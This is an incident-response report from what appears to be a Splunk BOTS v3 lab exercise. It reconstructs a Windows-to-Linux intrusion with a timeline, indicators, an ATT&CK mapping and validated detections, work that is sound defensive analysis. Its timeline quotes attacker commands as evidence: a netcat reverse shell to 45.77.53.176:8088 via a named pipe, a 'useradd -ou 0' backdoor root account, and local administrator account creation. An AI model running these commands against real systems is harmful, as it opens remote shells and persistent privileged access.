# INC-001: Hands-on-keyboard intrusion across FYODOR-L and hoth

|Field|Value|
|-|-|
|Status|Preliminary (analysis in progress)|
|Dataset|Splunk BOTS v3, `index=botsv3`|
|Event date|2018-08-20 (times are as displayed in Splunk; Linux log lines, osquery `calendarTime` and Sysmon UTC are 4 hours ahead)|
|Hosts involved|FYODOR-L (Windows), hoth / 192.168.9.30 (Linux)|
|External address|45.77.53.176|
|Analysis performed|2026-11-25, Splunk Enterprise lab|

Confidence labels: **Confirmed** = directly seen in log fields. **Likely** = inferred from several consistent log sources. **Open** = not yet verified.

## 1. Summary

A hidden, encoded PowerShell process on FYODOR-L (user `AzureAD\FyodorMalteskesko`) created a local administrator account named `svcvnc` at 06:08. The same PowerShell process was in contact with 45.77.53.176 from 06:01 until at least 07:59. At 06:47 a tool named `iexeplorer.exe` was written to `C:\Windows\Temp\unziped\lsof-master\`. From 07:05 that tool sent 17 command executions to a web application on 192.168.9.30 (`hoth`): reconnaissance, an account-creation command, staging of a kernel privilege-escalation source file, and a netcat reverse shell to 45.77.53.176:8088 (attempted at 07:13:56 and again at 07:34:01).

On hoth, osquery process events show two `useradd` runs creating `tomcat7` as a UID 0 account. The first (about 07:07) ran as the web application's unprivileged service user (uid 111, decoration `tomcat8`) and left no new-user entry in `auth.log`. The second (07:24:44 to 07:24:46) ran as root and is recorded by both `auth.log` and osquery with the same PID (12815). Root rights were therefore obtained between 07:07 and 07:24. How is not shown: the kernel exploit is the candidate, but its compilation or execution is not logged.

## 2. Timeline

|Time|Host|Event|Confidence|
|-|-|-|-|
|05:45:19|FYODOR-L, hoth|HTTP traffic containing `showcase.action` in `stream:http` (17 events on hoth until 07:05:17). Purpose unknown (may be normal application use)|Open|
|05:48:17|splunk.froth.ly, matar|45.77.53.176 appears in O365 message trace (8 events) and `stream:smtp` (4 events). Meaning unknown|Open|
|06:01|ABUNGST-L, FYODOR-L|First DNS and Sysmon records containing 45.77.53.176 (06:01:03 and 06:01:46)|Confirmed|
|06:08:17|FYODOR-L|`net user /add svcvnc [REDACTED]` run by net.exe / net1.exe; parent is `powershell.exe -NoP -NonI -W Hidden -enc ...`|Confirmed|
|06:08:35|FYODOR-L|`net localgroup administrators svcvnc /add`, same PowerShell parent (PID 6360), same logon session|Confirmed|
|06:24:58|hoth|`unix:useraccounts` shows `tomcat7` with UID 0 and `/bin/bash`; `usersWithLoginPrivs` lists root, klagerfield and tomcat7. This snapshot is earlier than the creation recorded by two other sources at 07:24 (see Open questions)|Confirmed as a record; timestamp disputed|
|06:45:03|FYODOR-L|One PowerShell/Operational event mentions 192.168.9.30 (not yet reviewed)|Open|
|06:47:41|FYODOR-L|powershell.exe created `lsof-master\powershell.exe` and `lsof-master\iexeplorer.exe` in `C:\Windows\Temp\unziped\` (Sysmon EventID 11)|Confirmed|
|07:00:04 to 07:01:55|hoth|SSH password logins for user `klagerfield` from 192.168.8.109 and 192.168.8.117, each followed by `sudo /bin/bash` as root. Relation to the intrusion unknown (may be routine administration)|Open|
|07:05:40 to 07:07:46|FYODOR-L to hoth|`iexeplorer.exe` run against `http://192.168.9.30:8080/frothlyinventory/showcase.action` with: `whoami`, `id`, `groups`, `cat /etc/passwd`, `useradd -ou 0 -g 0 ... tomcat7 -p [REDACTED]` (07:07:03), `uname -a`, `lsb_release -a`|Confirmed (commands sent)|
|07:07:17|hoth|osquery `proc_events`: `/usr/sbin/useradd` (PID 5752) run with uid/euid 111, decoration user `tomcat8`. No new-user entry in `auth.log`|Confirmed (process); failure Likely (unprivileged)|
|07:08:36 to 07:11:45|FYODOR-L to hoth|Base64 text written to `/tmp/colonel`, `ls -lf /tmp`, decoded to `/tmp/colonel.c`, then `cat` and `md5sum`. Header comment indicates a public Ubuntu 16.04.4 kernel privilege-escalation exploit|Confirmed (commands); exploit identity partly verified|
|07:09:48|FYODOR-L to hoth|Base64 data with a JPEG header written to an unreviewed destination|Open|
|07:12:51|FYODOR-L to hoth|`mknod /tmp/backpipe p`|Confirmed|
|07:13:56|FYODOR-L to hoth|`/bin/sh 0</tmp/backpipe \| nc 45.77.53.176 8088 1>/tmp/backpipe` (first attempt). Cisco ASA event at 07:13:57; hoth `ps` lists the attacker address from 07:14:24 and `netstat` from 07:14:54|Confirmed|
|07:24:44|hoth|`auth.log`: `useradd[12815]: new user: name=tomcat7, UID=0, GID=0, home=/home/tomcat7, shell=/bin/bash`. osquery records the same PID 12815 at 07:24:46, run as root (euid 0) with a different password string than the first attempt ([REDACTED]). No `iexeplorer.exe` command ran at this time; no sudo or SSH login accompanies it|Confirmed|
|07:33:45|FYODOR-L to hoth|`mknod /tmp/backpipe p` (second run)|Confirmed|
|07:34:01|FYODOR-L to hoth|Same `nc` reverse-shell command (second attempt)|Confirmed|
|07:48:24|hoth|`unix:useraccounts` shows `tomcat7` unchanged (UID 0)|Confirmed|
|up to 07:59|FYODOR-L, hoth|Sysmon and `ps` still contain 45.77.53.176|Confirmed|

## 3. Key findings

**Confirmed**

* `svcvnc` appears in 15 events (11 Security, 4 Sysmon), all between 06:08:17 and 06:08:35. No later activity under that name was found in botsv3.
* FYODOR-L Sysmon shows 3,850 network connections (EventID 3) from `powershell.exe` involving 45.77.53.176, from 06:01:46 to 07:59:36.
* 45.77.53.176 also appears on ABUNGST-L (1,070 Sysmon events, 06:01:04 to 07:59:24), on hoth (`netstat`, `ps`, `osquery:results`, `stream:http`) and in the Cisco ASA logs.
* Decoded fragments of the encoded PowerShell show `https://45.77.53.176:443`, the path `/admin/get.php` and an Internet Explorer 11 user-agent string. Only fragments were decoded, not the whole script.
* `iexeplorer.exe` ran 17 times against 192.168.9.30 (15 distinct commands). `mknod /tmp/backpipe p` and the `nc` reverse-shell command each ran twice.
* `192.168.9.30` is `hoth`: `interfaces` data shows `ens33` with `192.168.9.30/24`, MAC `00:0c:29:fb:12:05`.
* hoth runs an Ubuntu 16.04 package set with `gcc` installed.
* The web application's commands on hoth ran as uid 111 (osquery decoration `tomcat8`). A `useradd` run as root at 07:24:44 created the UID 0 account `tomcat7`. The name resembles a Tomcat service account, which is consistent with an attempt to blend in (not proven).
* osquery shows the arguments of the `useradd` command in a different order from the command sent. This is most likely an artifact of how the command line is reconstructed from audit fields, not a different command.

**Likely**

* The 07:07 `useradd` failed because the process was unprivileged.
* Root rights were obtained between 07:07 and 07:24, possibly through the staged kernel exploit or through the reverse shell started at 07:13:56. Neither is directly logged.
* The command pattern (URL ending in `.action`, then shell commands) is consistent with remote command execution against a Java web application such as Apache Struts. The specific vulnerability is not identified.

## 4. Open questions

1. **Timestamp of the 06:24:58 `tomcat7` snapshot.** `auth.log` (11:24:44 UTC) and osquery (11:24:46 UTC) agree on the creation time, while `unix:useraccounts` and `usersWithLoginPrivs` show the account at 10:24:58 UTC, one hour earlier. If those two inputs are offset by one hour, the snapshot falls about 12 to 14 seconds after the creation, which would fit. This is a hypothesis; the alternative is that the account existed earlier and was recreated.
2. How were root rights obtained? Was `/tmp/colonel.c` compiled and run, and what is the exact kernel version on hoth?
3. Where was the JPEG-header data written (07:09:48)?
4. What triggered the first contact with 45.77.53.176 on ABUNGST-L (06:01:03) and FYODOR-L (06:01:46)? What is the link to the 05:48 mail events?
5. Which hosts are 192.168.8.109 and 192.168.8.117, and are the `klagerfield` sessions at 07:00 related to this activity? JWORTOS-L, MKRAEUS-L and BSTOLL-L reference 192.168.9.30 between 06:52 and 07:00; a link is a hypothesis only.
6. What was the 06:45:03 PowerShell/Operational event, and where did the archive in `Temp\unziped` come from?
7. Was the FYODOR-L user account used by an attacker or did the user run the tooling?

## 5. Indicators of compromise

|Type|Value|
|-|-|
|IP|45.77.53.176 (TCP 443 from PowerShell, TCP 8088 reverse shell)|
|URL path|`/admin/get.php`|
|Internal URL used for commands|`http://192.168.9.30:8080/frothlyinventory/showcase.action`|
|File|`C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe`|
|SHA256|`EC732909362C261F3D7DF4A1D68BAA0133509FB36DD870658B0081108E1FA838`|
|File|`C:\Windows\Temp\unziped\lsof-master\powershell.exe` (hash not collected)|
|Windows account|`FYODOR-L\svcvnc`|
|Linux account|`tomcat7` with UID 0, created 07:24:44 by `useradd` PID 12815|
|Linux paths|`/tmp/colonel`, `/tmp/colonel.c`, `/tmp/backpipe`|
|Command-line pattern|`powershell.exe -NoP -NonI -W Hidden -enc`|

## 6. MITRE ATT&CK mapping (candidates)

|Technique|Evidence|
|-|-|
|T1059.001 PowerShell|Hidden encoded PowerShell parent|
|T1027 Obfuscated files or information|Base64-encoded command|
|T1136.001 Create account: local|`svcvnc` on FYODOR-L; UID 0 `tomcat7` on hoth (07:24:44)|
|T1098 Account manipulation|`net localgroup administrators svcvnc /add`|
|T1036.005 Masquerading|`iexeplorer.exe` and a copy named `powershell.exe` in `Temp`|
|T1059.004 Unix shell|Commands sent to hoth|
|T1033, T1082, T1087 Discovery|`whoami`, `uname -a`, `cat /etc/passwd`|
|T1068 Exploitation for privilege escalation|Kernel exploit source staged and a root-level action at 07:24:44; execution of the exploit itself is not verified|
|T1571 Non-standard port|Reverse shell to port 8088|

## 7. Detections

|ID|Purpose|Status|
|-|-|-|
|001|Local account created and added to Administrators within 600 seconds|Validated: one hit (`svcvnc`, 18 seconds apart)|
|002|Hidden encoded PowerShell parent spawning `net user /add` or `net localgroup administrators /add`|Validated: 2 hits on FYODOR-L (06:08:17, 06:08:35); no other hosts|
|003|Binary under `\Temp\` with a URL ending in `.action` in its command line|Validated: 34 events on FYODOR-L, 07:05:40 to 07:34:01|
|004|Very high count of `powershell.exe` connections to one external address|Idea|
|005|Linux `useradd` creating a UID 0 account: auth.log `new user` event with `UID=0` and a name other than root; osquery `proc_events` with path `/usr/sbin/useradd` and the `-o` option is a second source|Validated: auth.log 1 hit (hoth, PID 12815, 07:24:44); osquery 2 hits (PID 5752 euid 111, PID 12815 euid 0)|

Tested on one incident in BOTS v3; false-positive rate in a production environment is unknown. Detection 005 was run on hoth only.

Sysmon fields are not extracted in this lab, so searches use `rex` on `_raw`.

## 8. Recommended response (if this were production)

1. Isolate FYODOR-L and hoth; preserve memory and disk images.
2. Block 45.77.53.176 at the firewall and search for it across all hosts, including ABUNGST-L.
3. Disable `svcvnc`; review members of local Administrators on all Windows hosts.
4. On hoth, treat root as compromised: remove the UID 0 `tomcat7` account, review `/tmp`, cron jobs and SSH keys, and rebuild the host.
5. Review the web application patch level on 192.168.9.30:8080 and the privileges of its service account.
6. Reset credentials for `FyodorMalteskesko` and review the `klagerfield` sessions; investigate how the encoded PowerShell was first launched.

## 9. Handling notes

* Passwords in the original command lines (Sysmon and osquery) are replaced with `[REDACTED]`. osquery stores them in clear text, which is itself a finding.
* Base64 exploit text and the encoded PowerShell are intentionally not reproduced.
* Counts and times come from Splunk searches run in this lab on BOTS v3 data; searches that returned zero events do not prove the absence of activity.

